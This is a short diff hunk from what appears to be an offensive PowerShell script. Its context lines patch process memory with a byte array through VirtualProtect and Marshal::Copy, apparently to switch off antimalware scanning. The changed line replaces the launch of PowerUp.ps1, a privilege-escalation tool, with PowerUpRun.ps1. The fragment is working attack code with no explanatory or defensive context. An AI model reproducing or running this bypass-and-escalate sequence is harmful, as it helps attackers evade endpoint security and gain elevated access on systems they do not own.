@@ -22,4 +22,4 @@ $replace = 'VirtualProtec'
 $stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
 $marshalClass = [System.Runtime.InteropServices.Marshal]
 $marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
-.\PowerUp.ps1
+.\PowerUpRun.ps1
